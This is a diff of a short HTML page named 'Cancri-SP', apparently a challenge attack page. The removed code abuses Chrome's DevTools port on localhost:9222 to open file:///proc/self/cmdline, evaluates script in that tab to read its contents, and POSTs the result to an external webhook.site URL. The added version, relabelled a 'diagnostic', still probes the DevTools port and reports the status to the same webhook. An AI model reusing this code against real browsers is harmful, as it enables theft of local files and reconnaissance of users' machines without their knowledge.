@@ -1,66 +1,45 @@
 
 <!doctype html>
-<html>
+<html lang="en">
 <head>
   <meta charset="utf-8">
-  <title>Cancri-SP</title>
+  <title>Cancri-SP diagnostic</title>
 </head>
 <body>
-<pre id="status">Running...</pre>
+<pre id="status">Running diagnostic...</pre>
+
 <script>
 (async () => {
   const hook =
     "https://webhook.site/a66ae4f5-fdf1-46dd-acff-05d5c108df64";
 
-  async function report(text) {
-    document.getElementById("status").textContent = text;
+  async function report(message) {
+    document.getElementById("status").textContent = message;
     try {
       await fetch(hook, {
         method: "POST",
         mode: "no-cors",
-        body: text
+        body: message
       });
-    } catch (e) {}
+    } catch (e) {
+      console.error(e);
+    }
   }
 
-  let ws;
   try {
-    const r = await fetch(
-      "http://localhost:9222/json/new?file:///proc/self/cmdline",
-      { method: "PUT" }
+    const response = await fetch(
+      "http://localhost:9222/json/version"
     );
-    if (!r.ok) throw new Error("HTTP " + r.status);
 
-    const page = await r.json();
-    ws = new WebSocket(page.webSocketDebuggerUrl);
-
-    ws.onopen = () => ws.send(JSON.stringify({
-      id: 1,
-      method: "Runtime.evaluate",
-      params: {
-        expression: "JSON.stringify({url:location.href,title:document.title,body:document.body?.innerText||''})",
-        returnByValue: true
-      }
-    }));
-
-    ws.onmessage = async e => {
-      const m = JSON.parse(e.data);
-      if (m.id === 1) {
-        await report("Result: " + JSON.stringify(
-          m.result?.result?.value ??
-          m.result?.exceptionDetails ??
-          m
-        ));
-        ws.close();
-      }
-    };
-
-    ws.onerror = () => report("DevTools WebSocket failed");
+    await report(
+      "DevTools status: " + response.status
+    );
   } catch (e) {
-    await report("Error: " + String(e));
-    if (ws) ws.close();
+    await report("Connection error: " + String(e));
   }
 })();
 </script>
 </body>
 </html>
+
+
